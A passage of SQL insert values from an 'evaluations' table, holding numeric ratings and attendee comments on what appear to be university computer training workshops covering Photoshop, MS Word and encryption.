('evaluations', '207', 32, '0'),
('evaluations', '207', 33, '1'),
('evaluations', '207', 34, '0'),
('evaluations', '207', 35, '0'),
('evaluations', '207', 36, ''),
('evaluations', '207', 37, ''),
('evaluations', '207', 38, '2'),
('evaluations', '207', 39, '0'),
('evaluations', '208', 24, '0'),
('evaluations', '208', 25, '0'),
('evaluations', '208', 26, '1'),
('evaluations', '208', 27, '0'),
('evaluations', '208', 28, '2'),
('evaluations', '208', 30, '2'),
('evaluations', '208', 31, '1'),
('evaluations', '208', 32, '0'),
('evaluations', '208', 33, '0'),
('evaluations', '208', 34, '0'),
('evaluations', '208', 35, '0'),
('evaluations', '208', 36, 'warm up the room'),
('evaluations', '208', 37, 'n/a'),
('evaluations', '208', 38, '2'),
('evaluations', '208', 39, '0'),
('evaluations', '209', 24, '1'),
('evaluations', '209', 25, '0'),
('evaluations', '209', 26, '0'),
('evaluations', '209', 27, '0'),
('evaluations', '209', 28, '2'),
('evaluations', '209', 30, '1'),
('evaluations', '209', 31, '0'),
('evaluations', '209', 32, '1'),
('evaluations', '209', 33, '0'),
('evaluations', '209', 34, '0'),
('evaluations', '209', 35, '1'),
('evaluations', '209', 36, 'There was a lot of information to present. This workshop may need to be expanded to allow a more in-depth look at the capability of photoshop. Also, more time for hands on exercises.'),
('evaluations', '209', 37, ''),
('evaluations', '209', 38, '1'),
('evaluations', '209', 39, '1'),
('evaluations', '210', 24, '0'),
('evaluations', '210', 25, '0'),
('evaluations', '210', 26, '0'),
('evaluations', '210', 27, '0'),
('evaluations', '210', 28, '2'),
('evaluations', '210', 30, '2'),
('evaluations', '210', 31, '0'),
('evaluations', '210', 32, '0'),
('evaluations', '210', 33, '0'),
('evaluations', '210', 34, '0'),
('evaluations', '210', 35, '0'),
('evaluations', '210', 36, ''),
('evaluations', '210', 37, ''),
('evaluations', '210', 38, '0'),
('evaluations', '210', 39, '0'),
('evaluations', '212', 24, '0'),
('evaluations', '212', 25, '0'),
('evaluations', '212', 26, '0'),
('evaluations', '212', 27, '0'),
('evaluations', '212', 28, '2'),
('evaluations', '212', 30, '2'),
('evaluations', '212', 31, '0'),
('evaluations', '212', 32, '1'),
('evaluations', '212', 33, '0'),
('evaluations', '212', 34, '0'),
('evaluations', '212', 35, '0'),
('evaluations', '212', 36, 'Appreciated the extra tips on not only how the tool works, but examples of which tools work best for doing specific tasks.'),
('evaluations', '212', 37, 'Great overview'),
('evaluations', '212', 38, '1'),
('evaluations', '212', 39, '0'),
('evaluations', '213', 24, '2'),
('evaluations', '213', 25, '0'),
('evaluations', '213', 26, '1'),
('evaluations', '213', 27, '2'),
('evaluations', '213', 28, '0'),
('evaluations', '213', 30, '2'),
('evaluations', '213', 31, '2'),
('evaluations', '213', 32, '4'),
('evaluations', '213', 33, '4'),
('evaluations', '213', 34, '4'),
('evaluations', '213', 35, '2'),
('evaluations', '213', 36, 'Follow handouts step by step, so that it would be easier for new learners. More time for practice.'),
('evaluations', '213', 37, ''),
('evaluations', '213', 38, '1'),
('evaluations', '213', 39, '2'),
('evaluations', '214', 24, '0'),
('evaluations', '214', 25, '0'),
('evaluations', '214', 26, '0'),
('evaluations', '214', 27, '0'),
('evaluations', '214', 28, '2'),
('evaluations', '214', 30, '2'),
('evaluations', '214', 31, '0'),
('evaluations', '214', 32, '1'),
('evaluations', '214', 33, '0'),
('evaluations', '214', 34, '0'),
('evaluations', '214', 35, '0'),
('evaluations', '214', 36, 'Chris was great.  I''ve learned so much.  He answered questions I didn''t know I needed the answers for!!'),
('evaluations', '214', 37, ''),
('evaluations', '214', 38, '2'),
('evaluations', '214', 39, '1'),
('evaluations', '215', 24, '1'),
('evaluations', '215', 25, '0'),
('evaluations', '215', 26, '0'),
('evaluations', '215', 27, '0'),
('evaluations', '215', 28, '2'),
('evaluations', '215', 30, '2'),
('evaluations', '215', 31, '1'),
('evaluations', '215', 32, '1'),
('evaluations', '215', 33, '1'),
('evaluations', '215', 34, '1'),
('evaluations', '215', 35, '1'),
('evaluations', '215', 36, 'a more detailed usage like using the actions commands to automate editing of several images'),
('evaluations', '215', 37, ''),
('evaluations', '215', 38, '0'),
('evaluations', '215', 39, '0'),
('evaluations', '216', 24, '0'),
('evaluations', '216', 25, '0'),
('evaluations', '216', 26, '0'),
('evaluations', '216', 27, '0'),
('evaluations', '216', 28, '2'),
('evaluations', '216', 30, '2'),
('evaluations', '216', 31, '0'),
('evaluations', '216', 32, '1'),
('evaluations', '216', 33, '1'),
('evaluations', '216', 34, '0'),
('evaluations', '216', 35, '0'),
('evaluations', '216', 36, ''),
('evaluations', '216', 37, ''),
('evaluations', '216', 38, '0'),
('evaluations', '216', 39, '0'),
('evaluations', '217', 36, ''),
('evaluations', '217', 37, ''),
('evaluations', '218', 24, '1'),
('evaluations', '218', 25, '0'),
('evaluations', '218', 26, '0'),
('evaluations', '218', 27, '0'),
('evaluations', '218', 28, '2'),
('evaluations', '218', 30, '2'),
('evaluations', '218', 31, '1'),
('evaluations', '218', 32, '1'),
('evaluations', '218', 33, '1'),
('evaluations', '218', 34, '1'),
('evaluations', '218', 35, '0'),
('evaluations', '218', 36, ''),
('evaluations', '218', 37, ''),
('evaluations', '218', 38, '0'),
('evaluations', '218', 39, '0'),
('evaluations', '219', 24, '0'),
('evaluations', '219', 25, '0'),
('evaluations', '219', 26, '0'),
('evaluations', '219', 27, '0'),
('evaluations', '219', 28, '2'),
('evaluations', '219', 30, '2'),
('evaluations', '219', 31, '0'),
('evaluations', '219', 32, '0'),
('evaluations', '219', 33, '0'),
('evaluations', '219', 34, '0'),
('evaluations', '219', 35, '0'),
('evaluations', '219', 36, ''),
('evaluations', '219', 37, ''),
('evaluations', '219', 38, '0'),
('evaluations', '219', 39, '0'),
('evaluations', '220', 24, '0'),
('evaluations', '220', 25, '0'),
('evaluations', '220', 26, '0'),
('evaluations', '220', 27, '0'),
('evaluations', '220', 28, '2'),
('evaluations', '220', 30, '1'),
('evaluations', '220', 31, '0'),
('evaluations', '220', 32, '1'),
('evaluations', '220', 33, '1'),
('evaluations', '220', 34, '0'),
('evaluations', '220', 35, '0'),
('evaluations', '220', 36, ''),
('evaluations', '220', 37, ''),
('evaluations', '220', 38, '1'),
('evaluations', '220', 39, '0'),
('evaluations', '221', 24, '1'),
('evaluations', '221', 25, '0'),
('evaluations', '221', 26, '0'),
('evaluations', '221', 27, '1'),
('evaluations', '221', 28, '2'),
('evaluations', '221', 30, '1'),
('evaluations', '221', 31, '0'),
('evaluations', '221', 32, '0'),
('evaluations', '221', 33, '4'),
('evaluations', '221', 34, '1'),
('evaluations', '221', 35, '1'),
('evaluations', '221', 36, ''),
('evaluations', '221', 37, ''),
('evaluations', '221', 38, '1'),
('evaluations', '221', 39, '1'),
('evaluations', '223', 24, '0'),
('evaluations', '223', 25, '0'),
('evaluations', '223', 26, '0'),
('evaluations', '223', 27, '0'),
('evaluations', '223', 28, '0'),
('evaluations', '223', 30, '2'),
('evaluations', '223', 31, '0'),
('evaluations', '223', 32, '1'),
('evaluations', '223', 33, '4'),
('evaluations', '223', 34, '0'),
('evaluations', '223', 35, '1'),
('evaluations', '223', 36, 'Having the slides available to print out before the workshop would make it easier to add notes during the workshop and perhaps give the attendee a little preview of the topics.  A lot of info is compressed into 30 to 45 minutes...this makes it a little tough to absorb everything on a completely new topic.'),
('evaluations', '223', 37, 'I never used the old system so I have no comparison, but the new system was really straightforward.  There so seem to be some color issues that create "hidden" links on some pages.'),
('evaluations', '223', 38, '0'),
('evaluations', '223', 39, '0'),
('evaluations', '224', 24, '1'),
('evaluations', '224', 25, '0'),
('evaluations', '224', 26, '0'),
('evaluations', '224', 27, '0'),
('evaluations', '224', 28, '2'),
('evaluations', '224', 30, '2'),
('evaluations', '224', 31, '1'),
('evaluations', '224', 32, '0'),
('evaluations', '224', 33, '1'),
('evaluations', '224', 34, '0'),
('evaluations', '224', 35, '1'),
('evaluations', '224', 36, 'Had trouble with the download - CHASS e-mail didn''t like it for some reason'),
('evaluations', '224', 37, ''),
('evaluations', '224', 38, '0'),
('evaluations', '224', 39, '0'),
('evaluations', '225', 24, '1'),
('evaluations', '225', 25, '0'),
('evaluations', '225', 26, '0'),
('evaluations', '225', 27, '0'),
('evaluations', '225', 28, '0'),
('evaluations', '225', 30, '1'),
('evaluations', '225', 31, '0'),
('evaluations', '225', 32, '1'),
('evaluations', '225', 33, '1'),
('evaluations', '225', 34, '1'),
('evaluations', '225', 35, '1'),
('evaluations', '225', 36, 'needs to be longer'),
('evaluations', '225', 37, ''),
('evaluations', '225', 38, '1'),
('evaluations', '225', 39, '0'),
('evaluations', '226', 24, '1'),
('evaluations', '226', 25, '0'),
('evaluations', '226', 26, '0'),
('evaluations', '226', 27, '0'),
('evaluations', '226', 28, '2'),
('evaluations', '226', 30, '2'),
('evaluations', '226', 31, '0'),
('evaluations', '226', 32, '0'),
('evaluations', '226', 33, '0'),
('evaluations', '226', 34, '1'),
('evaluations', '226', 35, '0'),
('evaluations', '226', 36, ''),
('evaluations', '226', 37, ''),
('evaluations', '226', 38, '1'),
('evaluations', '226', 39, '1'),
('evaluations', '227', 24, '0'),
('evaluations', '227', 25, '0'),
('evaluations', '227', 26, '0'),
('evaluations', '227', 27, '0'),
('evaluations', '227', 28, '2'),
('evaluations', '227', 30, '2'),
('evaluations', '227', 31, '1'),
('evaluations', '227', 32, '1'),
('evaluations', '227', 33, '4'),
('evaluations', '227', 34, '1'),
('evaluations', '227', 35, '0'),
('evaluations', '227', 36, 'more time to do labwork'),
('evaluations', '227', 37, ''),
('evaluations', '227', 38, '0'),
('evaluations', '227', 39, '0'),
('evaluations', '229', 24, '1'),
('evaluations', '229', 25, '1'),
('evaluations', '229', 26, '1'),
('evaluations', '229', 27, '1'),
('evaluations', '229', 28, '2'),
('evaluations', '229', 30, '2'),
('evaluations', '229', 31, '1'),
('evaluations', '229', 32, '1'),
('evaluations', '229', 33, '4'),
('evaluations', '229', 34, '1'),
('evaluations', '229', 35, '1'),
('evaluations', '229', 36, 'Get facilities to turn the heat on.   It was very cold today.  \r\n\r\nIt would be helpful to do a little more explaining about what we are trying to do and have some example reports to show.  Then we know what we are trying to create.'),
('evaluations', '229', 37, ''),
('evaluations', '229', 38, '1'),
('evaluations', '229', 39, '1'),
('evaluations', '230', 24, '0'),
('evaluations', '230', 25, '1'),
('evaluations', '230', 26, '0'),
('evaluations', '230', 27, '1'),
('evaluations', '230', 28, '2'),
('evaluations', '230', 30, '2'),
('evaluations', '230', 31, '0'),
('evaluations', '230', 32, '1'),
('evaluations', '230', 33, '1'),
('evaluations', '230', 34, '0'),
('evaluations', '230', 35, '1'),
('evaluations', '230', 36, 'PLEASE figure out how to heat the classroom in cold winter months.  The frigid temperature in the classroom was not conducive to a comfortable learning environment.'),
('evaluations', '230', 37, ''),
('evaluations', '230', 38, '0'),
('evaluations', '230', 39, '0'),
('evaluations', '231', 24, '0'),
('evaluations', '231', 25, '0'),
('evaluations', '231', 26, '0'),
('evaluations', '231', 27, '0'),
('evaluations', '231', 28, '2'),
('evaluations', '231', 30, '2'),
('evaluations', '231', 31, '0'),
('evaluations', '231', 32, '0'),
('evaluations', '231', 33, '0'),
('evaluations', '231', 34, '0'),
('evaluations', '231', 35, '0'),
('evaluations', '231', 36, ''),
('evaluations', '231', 37, ''),
('evaluations', '231', 38, '0'),
('evaluations', '231', 39, '0'),
('evaluations', '232', 24, '1'),
('evaluations', '232', 25, '0'),
('evaluations', '232', 26, '1'),
('evaluations', '232', 27, '1'),
('evaluations', '232', 28, '0'),
('evaluations', '232', 30, '1'),
('evaluations', '232', 31, '1'),
('evaluations', '232', 32, '1'),
('evaluations', '232', 33, '1'),
('evaluations', '232', 34, '1'),
('evaluations', '232', 35, '1'),
('evaluations', '232', 36, 'More time is needed to show the new features and how they work in MS word'),
('evaluations', '232', 37, ''),
('evaluations', '232', 38, '0'),
('evaluations', '232', 39, '0'),
('evaluations', '233', 24, '1'),
('evaluations', '233', 25, '0'),
('evaluations', '233', 26, '0'),
('evaluations', '233', 27, '0'),
('evaluations', '233', 28, '2'),
('evaluations', '233', 30, '2'),
('evaluations', '233', 31, '0'),
('evaluations', '233', 32, '1'),
('evaluations', '233', 33, '1'),
('evaluations', '233', 34, '1'),
('evaluations', '233', 35, '1'),
('evaluations', '233', 36, 'No suggestions come to mind.'),
('evaluations', '233', 37, 'I don''t have any suggestions.'),
('evaluations', '233', 38, '1'),
('evaluations', '233', 39, '1'),
('evaluations', '234', 24, '1'),
('evaluations', '234', 25, '0'),
('evaluations', '234', 26, '1'),
('evaluations', '234', 27, '1'),
('evaluations', '234', 28, '2'),
('evaluations', '234', 30, '2'),
('evaluations', '234', 31, '1'),
('evaluations', '234', 32, '1'),
('evaluations', '234', 33, '1'),
('evaluations', '234', 34, '1'),
('evaluations', '234', 35, '1'),
('evaluations', '234', 36, 'The only problem was that the computer I used automatically shut down several times.'),
('evaluations', '234', 37, ''),
('evaluations', '234', 38, '1'),
('evaluations', '234', 39, '1'),
('evaluations', '235', 24, '1'),
('evaluations', '235', 25, '0'),
('evaluations', '235', 26, '0'),
('evaluations', '235', 27, '0'),
('evaluations', '235', 28, '2'),
('evaluations', '235', 30, '1'),
('evaluations', '235', 31, '1'),
('evaluations', '235', 32, '1'),
('evaluations', '235', 33, '1'),
('evaluations', '235', 34, '1'),
('evaluations', '235', 35, '1'),
('evaluations', '235', 36, 'Make it longer and cover more topics'),
('evaluations', '235', 37, ''),
('evaluations', '235', 38, '1'),
('evaluations', '235', 39, '1'),
('evaluations', '236', 24, '1'),
('evaluations', '236', 25, '1'),
('evaluations', '236', 26, '0'),
('evaluations', '236', 27, '1'),
('evaluations', '236', 28, '2'),
('evaluations', '236', 30, '2'),
('evaluations', '236', 31, '1'),
('evaluations', '236', 32, '1'),
('evaluations', '236', 33, '1'),
('evaluations', '236', 34, '1'),
('evaluations', '236', 35, '1'),
('evaluations', '236', 36, ''),
('evaluations', '236', 37, ''),
('evaluations', '236', 38, '1'),
('evaluations', '236', 39, '1'),
('evaluations', '237', 24, '0'),
('evaluations', '237', 25, '0'),
('evaluations', '237', 26, '0'),
('evaluations', '237', 27, '0'),
('evaluations', '237', 28, '2'),
('evaluations', '237', 30, '2'),
('evaluations', '237', 31, '1'),
('evaluations', '237', 32, '1'),
('evaluations', '237', 33, '1'),
('evaluations', '237', 34, '0'),
('evaluations', '237', 35, '0'),
('evaluations', '237', 36, 'Great job!'),
('evaluations', '237', 37, 'n/a'),
('evaluations', '237', 38, '0'),
('evaluations', '237', 39, '0'),
('evaluations', '238', 24, '0'),
('evaluations', '238', 25, '0'),
('evaluations', '238', 26, '0'),
('evaluations', '238', 27, '0'),
('evaluations', '238', 28, '2'),
('evaluations', '238', 30, '2'),
('evaluations', '238', 31, '0'),
('evaluations', '238', 32, '0'),
('evaluations', '238', 33, '0'),
('evaluations', '238', 34, '0'),
('evaluations', '238', 35, '0'),
('evaluations', '238', 36, ''),
('evaluations', '238', 37, ''),
('evaluations', '238', 38, '0'),
('evaluations', '238', 39, '0'),
('evaluations', '239', 24, '0'),
('evaluations', '239', 25, '0'),
('evaluations', '239', 26, '0'),
('evaluations', '239', 27, '0'),
('evaluations', '239', 28, '2'),
('evaluations', '239', 30, '2'),
('evaluations', '239', 31, '0'),
('evaluations', '239', 32, '0'),
('evaluations', '239', 33, '4'),
('evaluations', '239', 34, '0'),
('evaluations', '239', 35, '0'),
('evaluations', '239', 36, ''),
('evaluations', '239', 37, ''),
('evaluations', '239', 38, '0'),
('evaluations', '239', 39, '0'),
('evaluations', '240', 24, '1'),
('evaluations', '240', 25, '1'),
('evaluations', '240', 26, '0'),
('evaluations', '240', 27, '1'),
('evaluations', '240', 28, '2'),
('evaluations', '240', 30, '2'),
('evaluations', '240', 31, '0'),
('evaluations', '240', 32, '1'),
('evaluations', '240', 33, '1'),
('evaluations', '240', 34, '1'),
('evaluations', '240', 35, '1'),
('evaluations', '240', 36, 'Maybe in the beginning of each session more explanation of the overall theory and logic of what is happening and what we are trying to do would be helpful.  The pictures are very helpful, but sometimes the objective is not so clear.  This may just be my slow learning personality though.  The class was very good overall and I hope I will be able to make use of the knowledge practically.'),
('evaluations', '240', 37, ''),
('evaluations', '240', 38, '0'),
('evaluations', '240', 39, '0'),
('evaluations', '241', 24, '1'),
('evaluations', '241', 25, '1'),
('evaluations', '241', 26, '1'),
('evaluations', '241', 27, '1'),
('evaluations', '241', 28, '2'),
('evaluations', '241', 30, '2'),
('evaluations', '241', 31, '1'),
('evaluations', '241', 32, '1'),
('evaluations', '241', 33, '1'),
('evaluations', '241', 34, '1'),
('evaluations', '241', 35, '1'),
('evaluations', '241', 36, ''),
('evaluations', '241', 37, ''),
('evaluations', '241', 38, '1'),
('evaluations', '241', 39, '1'),
('evaluations', '242', 24, '0'),
('evaluations', '242', 25, '0'),
('evaluations', '242', 26, '0'),
('evaluations', '242', 27, '0'),
('evaluations', '242', 28, '2'),
('evaluations', '242', 30, '2'),
('evaluations', '242', 31, '0'),
('evaluations', '242', 32, '1'),
('evaluations', '242', 33, '1'),
('evaluations', '242', 34, '0'),
('evaluations', '242', 35, '0'),
('evaluations', '242', 36, 'Workshop advertised as 12:15 PM - 1:00 PM but it was really 12:15 PM - 1:15 PM.'),
('evaluations', '242', 37, ''),
('evaluations', '242', 38, '0'),
('evaluations', '242', 39, '1'),
('evaluations', '243', 24, '1'),
('evaluations', '243', 25, '0'),
('evaluations', '243', 26, '0'),
('evaluations', '243', 27, '0'),
('evaluations', '243', 28, '2'),
('evaluations', '243', 30, '2'),
('evaluations', '243', 31, '1'),
('evaluations', '243', 32, '0'),
('evaluations', '243', 33, '1'),
('evaluations', '243', 34, '0'),
('evaluations', '243', 35, '1'),
('evaluations', '243', 36, 'I''d like a few real life examples demonstrating how encryption would be helpful to me. I think it was assumed that we all already knew why we should encrypt our data, but I didn''t.'),
('evaluations', '243', 37, ''),
('evaluations', '243', 38, '1'),
('evaluations', '244', 24, '0'),
('evaluations', '244', 25, '0'),
('evaluations', '244', 26, '0'),
('evaluations', '244', 27, '0'),
('evaluations', '244', 28, '2'),
('evaluations', '244', 30, '2'),
('evaluations', '244', 31, '1'),
('evaluations', '244', 32, '1'),
('evaluations', '244', 33, '1'),
('evaluations', '244', 34, '0'),
('evaluations', '244', 35, '1'),
('evaluations', '244', 36, ''),
('evaluations', '244', 37, ''),
('evaluations', '244', 38, '0'),
('evaluations', '244', 39, '0'),
('evaluations', '245', 24, '0'),
('evaluations', '245', 25, '0'),
('evaluations', '245', 26, '0'),
('evaluations', '245', 27, '0'),
('evaluations', '245', 28, '2'),
('evaluations', '245', 30, '2'),
('evaluations', '245', 31, '0'),
('evaluations', '245', 32, '0'),
('evaluations', '245', 33, '0'),
('evaluations', '245', 34, '1'),
('evaluations', '245', 35, '0'),
('evaluations', '245', 36, 'N/A'),
('evaluations', '245', 37, ''),
('evaluations', '245', 38, '0'),
('evaluations', '245', 39, '1'),
('evaluations', '246', 24, '0'),
('evaluations', '246', 25, '0'),
('evaluations', '246', 26, '0'),
('evaluations', '246', 27, '0'),
('evaluations', '246', 28, '2'),
('evaluations', '246', 30, '2'),
('evaluations', '246', 31, '1'),
('evaluations', '246', 32, '0'),
('evaluations', '246', 33, '0'),
('evaluations', '246', 34, '0'),
('evaluations', '246', 35, '0'),
('evaluations', '246', 36, ''),
('evaluations', '246', 37, 'None'),
('evaluations', '246', 38, '0'),
('evaluations', '246', 39, '0'),
('evaluations', '247', 24, '0'),
('evaluations', '247', 25, '0'),
('evaluations', '247', 26, '0'),
('evaluations', '247', 27, '0'),
('evaluations', '247', 28, '2'),
('evaluations', '247', 30, '2'),
('evaluations', '247', 31, '1'),
('evaluations', '247', 32, '1'),
('evaluations', '247', 33, '1'),
('evaluations', '247', 34, '0'),
('evaluations', '247', 35, '1'),
('evaluations', '247', 36, ''),
('evaluations', '247', 37, ''),
('evaluations', '247', 38, '0'),
('evaluations', '247', 39, '2'),
('evaluations', '248', 24, '0'),
('evaluations', '248', 25, '0'),
('evaluations', '248', 26, '0'),
('evaluations', '248', 27, '0'),
('evaluations', '248', 28, '2'),
('evaluations', '248', 30, '2'),
('evaluations', '248', 31, '0'),
('evaluations', '248', 32, '0'),
('evaluations', '248', 33, '0'),
('evaluations', '248', 34, '0'),
('evaluations', '248', 35, '0'),
('evaluations', '248', 36, 'provide a certificate for the end user'),
('evaluations', '248', 37, ''),
('evaluations', '248', 38, '0'),
('evaluations', '248', 39, '0'),
('evaluations', '250', 24, '0'),
('evaluations', '250', 25, '0'),
('evaluations', '250', 26, '0'),
('evaluations', '250', 27, '0'),
('evaluations', '250', 28, '2'),
('evaluations', '250', 30, '2'),
('evaluations', '250', 31, '0'),
('evaluations', '250', 32, '0'),
('evaluations', '250', 33, '0'),
('evaluations', '250', 34, '0'),
('evaluations', '250', 35, '0'),
('evaluations', '250', 36, 'I don''t see how it could be made any better.'),
('evaluations', '250', 37, 'I don''t see how it could get any better.'),
('evaluations', '250', 38, '0'),
('evaluations', '250', 39, '0'),
('evaluations', '251', 24, '0'),
('evaluations', '251', 25, '0'),
('evaluations', '251', 26, '0'),
('evaluations', '251', 27, '0'),
('evaluations', '251', 28, '2'),
('evaluations', '251', 30, '2'),
('evaluations', '251', 31, '1'),
('evaluations', '251', 32, '1'),
('evaluations', '251', 33, '1'),
('evaluations', '251', 34, '0'),
('evaluations', '251', 35, '1'),
('evaluations', '251', 36, ''),
('evaluations', '251', 37, ''),
('evaluations', '251', 38, '1'),
('evaluations', '251', 39, '0'),
('evaluations', '252', 24, '1'),
('evaluations', '252', 25, '1'),
('evaluations', '252', 26, '1'),
('evaluations', '252', 27, '1'),
('evaluations', '252', 28, '2'),
('evaluations', '252', 30, '2'),
('evaluations', '252', 31, '1'),
('evaluations', '252', 32, '1'),
('evaluations', '252', 33, '2'),
('evaluations', '252', 34, '1'),
('evaluations', '252', 35, '1'),
('evaluations', '252', 36, ''),
('evaluations', '252', 37, ''),
('evaluations', '252', 38, '1'),
('evaluations', '252', 39, '1'),
('evaluations', '253', 24, '1'),
('evaluations', '253', 25, '1'),
('evaluations', '253', 26, '0'),
('evaluations', '253', 27, '1'),
('evaluations', '253', 28, '2'),
('evaluations', '253', 30, '2'),
('evaluations', '253', 31, '1'),
('evaluations', '253', 32, '1'),
('evaluations', '253', 33, '1'),
('evaluations', '253', 34, '1'),
('evaluations', '253', 35, '1'),
('evaluations', '253', 36, 'Provide a little more detail on what will actually be covered in class.'),
('evaluations', '253', 37, ''),
('evaluations', '253', 38, '1'),
('evaluations', '253', 39, '0'),
('evaluations', '254', 24, '1'),
('evaluations', '254', 25, '0'),
('evaluations', '254', 26, '1'),
('evaluations', '254', 27, '1'),
('evaluations', '254', 28, '0'),
('evaluations', '254', 30, '2'),
('evaluations', '254', 31, '0'),
('evaluations', '254', 32, '1'),
('evaluations', '254', 33, '1'),
('evaluations', '254', 34, '1'),
('evaluations', '254', 35, '0'),
('evaluations', '254', 36, 'Thanks for letting me "play" with the concepts.  Little by little, more concepts, tools are "sticking".'),
('evaluations', '254', 37, 'n/a'),
('evaluations', '254', 38, '1'),
('evaluations', '254', 39, '1'),
('evaluations', '255', 24, '1'),
('evaluations', '255', 25, '1'),
('evaluations', '255', 26, '1'),
('evaluations', '255', 27, '1'),
('evaluations', '255', 28, '0'),
('evaluations', '255', 30, '2'),
('evaluations', '255', 31, '1'),
('evaluations', '255', 32, '4'),
('evaluations', '255', 33, '4'),
('evaluations', '255', 34, '1'),
('evaluations', '255', 35, '1'),
('evaluations', '255', 36, 'The instructor should show first and the class will follow his/her lead.'),
('evaluations', '255', 37, ''),
('evaluations', '255', 38, '0'),
('evaluations', '255', 39, '0'),
('evaluations', '256', 24, '1'),
('evaluations', '256', 25, '0'),
('evaluations', '256', 26, '0'),
('evaluations', '256', 27, '0'),
('evaluations', '256', 28, '2'),
('evaluations', '256', 30, '2'),
('evaluations', '256', 31, '1'),
('evaluations', '256', 32, '0'),
('evaluations', '256', 33, '1'),
('evaluations', '256', 34, '0'),
('evaluations', '256', 35, '0'),
('evaluations', '256', 36, 'I was waitlisted when I signed up for this class & then receieved an email this morning telling me I could attend this afternoon.  I thought I was coming to the 1st course; however, when I arrived I learned there was a class before this.  I was able to pick up, but I''m guessing it would have been easier had I attended the previous class.  Not sure how I missed that 1st class???  Thought it was worth mentioning in case I''m not the only one confused by the process.'),
('evaluations', '256', 37, ''),
('evaluations', '256', 38, '0'),
('evaluations', '256', 39, '1'),
('evaluations', '257', 24, '0'),
('evaluations', '257', 25, '0'),
('evaluations', '257', 26, '0'),
('evaluations', '257', 27, '0'),
('evaluations', '257', 28, '2'),
('evaluations', '257', 30, '2'),
('evaluations', '257', 31, '0'),
('evaluations', '257', 32, '1'),
('evaluations', '257', 33, '1'),
('evaluations', '257', 34, '0'),
('evaluations', '257', 35, '0'),
('evaluations', '257', 36, ''),
('evaluations', '257', 37, 'No suggestions - very well presented.'),
('evaluations', '257', 38, '1'),
('evaluations', '257', 39, '1'),
('evaluations', '259', 24, '1'),
('evaluations', '259', 25, '0'),
('evaluations', '259', 26, '1'),
('evaluations', '259', 27, '1'),
('evaluations', '259', 28, '0'),
('evaluations', '259', 30, '1'),
('evaluations', '259', 31, '1'),
('evaluations', '259', 32, '1'),
('evaluations', '259', 33, '4'),
('evaluations', '259', 34, '1'),
('evaluations', '259', 35, '1'),
('evaluations', '259', 36, ''),
('evaluations', '259', 37, ''),
('evaluations', '259', 38, '0'),
('evaluations', '259', 39, '1'),
('evaluations', '260', 24, '1'),
('evaluations', '260', 25, '1'),
('evaluations', '260', 26, '1'),
('evaluations', '260', 27, '1'),
('evaluations', '260', 28, '2'),
('evaluations', '260', 30, '2'),
('evaluations', '260', 31, '1'),
('evaluations', '260', 32, '1'),
('evaluations', '260', 33, '1'),
('evaluations', '260', 34, '1'),
('evaluations', '260', 35, '1'),
('evaluations', '260', 36, ''),
('evaluations', '260', 37, ''),
('evaluations', '260', 38, '0'),
('evaluations', '260', 39, '0'),
('evaluations', '261', 24, '1'),
('evaluations', '261', 25, '0'),
('evaluations', '261', 26, '0'),
('evaluations', '261', 27, '1'),
('evaluations', '261', 28, '2'),
('evaluations', '261', 30, '1'),
('evaluations', '261', 31, '0'),
('evaluations', '261', 32, '1'),
('evaluations', '261', 33, '1'),
('evaluations', '261', 34, '1'),
('evaluations', '261', 35, '1'),
('evaluations', '261', 36, 'No thoughts.'),
('evaluations', '261', 37, 'Did not have any experience with Photo Shop. It was a little difficult to execute lab.'),
('evaluations', '261', 38, '1'),
('evaluations', '261', 39, '0'),
('evaluations', '262', 24, '1'),
('evaluations', '262', 25, '1'),
('evaluations', '262', 26, '1'),
('evaluations', '262', 27, '1'),
('evaluations', '262', 28, '0'),
('evaluations', '262', 30, '1'),
('evaluations', '262', 31, '0'),
('evaluations', '262', 32, '1'),
('evaluations', '262', 33, '1'),
('evaluations', '262', 34, '1'),
('evaluations', '262', 35, '1'),
('evaluations', '262', 36, 'Divide it into more sections so that the instructor could go into more detail'),
('evaluations', '262', 37, ''),
('evaluations', '262', 38, '0'),
('evaluations', '262', 39, '1'),
('evaluations', '263', 24, '1'),
('evaluations', '263', 25, '0'),
('evaluations', '263', 26, '0'),
('evaluations', '263', 27, '1'),
('evaluations', '263', 28, '2'),
('evaluations', '263', 30, '2'),
('evaluations', '263', 31, '1'),
('evaluations', '263', 32, '1'),
('evaluations', '263', 33, '1'),
('evaluations', '263', 34, '1'),
('evaluations', '263', 35, '1'),
('evaluations', '263', 36, 'Possibly have everyone bring in something they are working on so that we can use the skills we have learned and apply them to our live projects.'),
('evaluations', '263', 37, ''),
('evaluations', '263', 38, '1'),
('evaluations', '263', 39, '0'),
('evaluations', '264', 24, '1'),
('evaluations', '264', 25, '0'),
('evaluations', '264', 26, '1'),
('evaluations', '264', 27, '2'),
('evaluations', '264', 28, '2'),
('evaluations', '264', 30, '2'),
('evaluations', '264', 31, '1'),
('evaluations', '264', 32, '1'),
('evaluations', '264', 33, '4'),
('evaluations', '264', 34, '4'),
('evaluations', '264', 35, '1'),
('evaluations', '264', 36, ''),
('evaluations', '264', 37, ''),
('evaluations', '264', 38, '1'),
('evaluations', '264', 39, '1'),
('evaluations', '265', 24, '1'),
('evaluations', '265', 25, '1'),
('evaluations', '265', 26, '1'),
('evaluations', '265', 27, '1'),
('evaluations', '265', 28, '0'),
('evaluations', '265', 30, '2'),
('evaluations', '265', 31, '1'),
('evaluations', '265', 32, '4'),
('evaluations', '265', 33, '4'),
('evaluations', '265', 34, '1'),
('evaluations', '265', 35, '1'),
('evaluations', '265', 36, 'provide step-by-step instructions so a finished product can be displayed.'),
('evaluations', '265', 37, ''),
('evaluations', '265', 38, '0'),
('evaluations', '265', 39, '0'),
('evaluations', '266', 24, '0'),
('evaluations', '266', 25, '0'),
('evaluations', '266', 26, '0'),
('evaluations', '266', 27, '0'),
('evaluations', '266', 28, '2'),
('evaluations', '266', 30, '2'),
('evaluations', '266', 31, '0'),
('evaluations', '266', 32, '1'),
('evaluations', '266', 33, '0'),
('evaluations', '266', 34, '0'),
('evaluations', '266', 35, '0'),
('evaluations', '266', 36, 'Cooler room please.  Morning hours? Thanks!'),
('evaluations', '266', 37, ''),
('evaluations', '266', 38, '0'),
('evaluations', '266', 39, '0'),
('evaluations', '267', 24, '1'),
('evaluations', '267', 25, '0'),
('evaluations', '267', 26, '0'),
('evaluations', '267', 27, '0'),
('evaluations', '267', 28, '2'),
('evaluations', '267', 30, '1'),
('evaluations', '267', 31, '0'),
('evaluations', '267', 32, '1'),
('evaluations', '267', 33, '1'),
('evaluations', '267', 34, '0'),
('evaluations', '267', 35, '1'),
('evaluations', '267', 36, ''),
